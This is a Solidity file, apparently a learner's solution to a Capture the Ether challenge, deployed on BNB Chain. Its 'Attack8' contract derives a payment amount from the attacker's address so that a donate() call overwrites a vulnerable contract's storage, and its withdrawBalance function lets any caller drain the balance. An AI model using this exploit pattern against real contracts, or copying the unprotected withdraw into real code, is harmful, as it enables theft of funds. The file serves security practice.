/**
 *Submitted for verification at BscScan.com on 2022-09-15
*/

// File: LEARNING/CHALLENGES/contracts/libraries/withdrawable.sol

pragma solidity ^0.8.1;



contract withdrawable{



    function withdrawBalance() public {

        payable(msg.sender).transfer(address(this).balance);

    }



    function checkBalance() public view returns(uint bal, uint bal1, uint bal2){

        bal = address(this).balance;

        bal1 = bal/(10**9);

        bal2 = bal/(10**18);

    }



    receive() external payable {}

}
// File: LEARNING/CHALLENGES/contracts/Capture the Ether/9B.sol

pragma solidity ^0.8.5;



interface Donate {

    function donate(uint256 etherAmount) external payable;

}




contract Attack8 is withdrawable {



    Donate donateC;

    

    constructor(address _addr ) payable  {

        donateC = Donate(_addr);

    }



    function calcutate(address attacker) public pure returns(uint256 msgvalue, uint256 etherAmount){

        bytes32 byteAddress = bytes20(attacker);

        etherAmount = uint256(byteAddress);

        uint256 scale = 10**18 * 1 ether;

        msgvalue = etherAmount / scale;

    }



    function attack(address attacker) public{

        bytes32 byteAddress = bytes20(attacker);

        uint256 etherAmount = uint256(byteAddress);

        uint256 scale = 10**18 * 1 ether;

        uint256 msgvalue = etherAmount / scale;

        donateC.donate{value : msgvalue}(etherAmount);

    }

}